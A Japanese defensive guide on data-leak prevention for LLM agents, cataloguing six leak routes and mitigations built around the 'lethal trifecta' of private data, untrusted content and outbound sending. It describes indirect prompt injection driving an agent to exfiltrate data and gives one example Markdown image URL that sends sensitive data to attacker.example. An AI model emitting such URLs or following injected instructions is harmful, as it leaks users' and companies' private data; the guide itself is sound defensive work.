# データ漏えい対策

## この記事の目的

Agent を経由してデータが漏れる経路 — 攻撃による持ち出し(data exfiltration)と、設計不備による事故の両方 — を網羅的に列挙し、経路ごとの遮断を設計できるようになります。核となる判断「致命的三重奏のどれを外すか」を自分のシステムで下せるようになります。

## 対象読者

- 非公開データ(社内文書・顧客情報・個人情報)にアクセスする Agent を設計・運用するエンジニア
- Agent システムの情報漏えいリスクを評価するセキュリティ担当者

## 前提知識

- [Agent の脅威モデル概観](threat-model-overview.md) — 致命的三重奏の定義
- [プロンプトインジェクション](prompt-injection.md) — 攻撃起因の持ち出しを駆動する手段

## 本文

### 概要: 漏えいは 2 系統 — 攻撃と事故

Agent 経由のデータ漏えいには、性質の異なる 2 系統があります。

1. **攻撃による持ち出し** — 間接プロンプトインジェクションで「非公開データを読んで外部に送る」動作を駆動される。致命的三重奏(非公開データへのアクセス + 信頼できないコンテンツ + 外部送信能力)が揃った Agent で構造的に成立します
2. **事故による混入** — 攻撃がなくても、見せてはいけないデータが応答・ログ・別ユーザーのセッションに混ざる。権限スコープの不備・ログ設計の不備が原因です

対策を「攻撃対策」だけに絞ると事故系が残り、逆も然りです。以下の経路カタログは両方をカバーします。

### 詳細: 漏えい経路のカタログ

| 経路 | 何が起きるか | 主な対策 |
| --- | --- | --- |
| 応答経由 | ユーザーに見せる権限のないデータが応答に混ざる(事故系の典型) | データアクセスのスコープをツール実装側で強制([ツール権限設計とサンドボックス](tool-permissions-and-sandboxing.md))。応答前の出力フィルタ |
| 送信系ツール経由 | メール送信・チケット起票・外部 API 呼び出しに機微データを載せて送る(攻撃系の典型) | 送信先の許可リスト、送信系ツールへの承認ゲート、送信内容の検査 |
| リンク・画像 URL 経由 | 応答中の Markdown 画像・リンクの URL パラメータにデータを埋め込み、レンダリング・クリック時に攻撃者のサーバーへ送信させる | 応答レンダリング側で外部画像の自動読み込みを無効化・プロキシ化し、リンク先ドメインを制限する |
| ログ・トレース経由 | プロンプト・応答の全文ログに含まれる機微データが、広いアクセス権・長い保持期間で漏れる | マスキング・保持期間・アクセス制御([可観測性とトレーシング](../05-operations/observability-and-tracing.md)) |
| メモリ・履歴経由 | 長期メモリ・会話履歴・キャッシュに入った機微データが、別ユーザー・別テナントのセッションに再登場する | メモリ・履歴のテナント/ユーザー分離([メモリと状態管理](../01-concepts/memory-and-state.md))。共有ストアに書く内容の制限 |
| 外部サービス経由 | LLM API・監視 SaaS・外部 MCP サーバーに送ったデータが、先方の保持・学習・再提供の対象になる | ベンダーのデータ利用ポリシー確認、送信データの最小化、契約・設定でのオプトアウト |

リンク・画像 URL 経由は見落とされやすい古典です。「外部に送信するツールを持っていないから安全」と考えていても、**応答に URL を書けること自体が送信チャネル**になります(例: `![説明](https://attacker.example/収集?q=<機微データ>)` をレンダラーが自動読み込みする)。

### 詳細: 対策の優先順位 — まず三重奏を崩す

経路ごとの個別対策の前に、構造を確認します。[Agent の脅威モデル概観](threat-model-overview.md) の致命的三重奏 — 非公開データ・信頼できないコンテンツ・外部送信 — のうち**どれか 1 つを外せば、攻撃系の持ち出し経路は構造的に閉じます**。

| 外すもの | 設計 | 例 |
| --- | --- | --- |
| 非公開データ | その Agent には公開情報しか渡さない | Web リサーチ専用 Agent は社内データに接続しない |
| 信頼できないコンテンツ | 非公開データを扱う Agent は外部コンテンツを読まない | 社内文書 Q&A Agent には Web 閲覧を持たせない |
| 外部送信 | 送信能力を持たせない、または送信先を許可リストの内部宛先に限定する | 分析 Agent の出力は社内ストレージのみ。応答の外部 URL を無害化 |

3 つとも必要な要件(例: 社内データを使って外部に問い合わせメールを書く Agent)の場合は、**送信の直前に人間の承認**([Human-in-the-Loop 設計](../02-architecture/human-in-the-loop.md))を挟むことで「自動での持ち出し」を断ちます。マルチエージェント構成なら、三重奏を 1 つの Agent に集めず役割ごとに分割する設計も有効です([シングルエージェントとマルチエージェント](../01-concepts/single-vs-multi-agent.md))。

### 詳細: 事故系の基本 — 認可はモデルの手前ではなく奥で

事故系の漏えいの多くは、「モデルに渡してから絞ろうとする」設計から生まれます。モデルのコンテキストに入ったデータは、応答に出てくる可能性が常にあります。

- **認可フィルタは検索・取得ツールの実装側**で掛けます。「このユーザーに見せてよいデータだけがモデルに入る」を原則にします
- 出力フィルタ(機微パターンの検知)は最後の網であり、確率的な対策です。設計の主軸にしません

## 実務での注意点

### アンチパターン

- **「送信ツールがないから漏えいしない」と判断する** → 応答中のリンク・画像 URL が送信チャネルになる → レンダリング側の無害化(外部画像ブロック・ドメイン制限)まで含めて評価する
- **モデルに全データを渡してから「権限外のことは答えないで」と指示する** → コンテキストに入ったデータは出力されうる。指示は決定的な制御ではない → 認可をツール実装側で強制し、権限外データをモデルに入れない
- **三重奏が揃った Agent を「便利だから」と 1 つ作る** → 間接インジェクション 1 通で全社データの持ち出しが可能な構造になる → 三重奏のどれかを外すか、役割分割・送信前承認で自動持ち出しを断つ
- **トレース・ログを対策の対象外にする** → 本体を固めても、全文ログの広いアクセス権が実質的な漏えい経路になる → ログのマスキング・保持期間・アクセス制御を本体と同じ基準で設計する

### チェックリスト

- [ ] 6 つの経路(応答・送信ツール・URL・ログ・メモリ・外部サービス)それぞれの対策を説明できる
- [ ] 致命的三重奏の有無を確認し、「どれを外すか(または送信前承認か)」を明示的に決めた
- [ ] データアクセスの認可がツール実装側で強制されている
- [ ] 応答レンダリングで外部画像の自動読み込みが無効化・プロキシ化されている
- [ ] 送信系ツールに送信先の許可リストと承認ゲートがある
- [ ] メモリ・履歴・キャッシュがテナント/ユーザーで分離されている
- [ ] 利用する外部サービス(LLM API・監視・MCP)のデータ保持・学習ポリシーを確認した
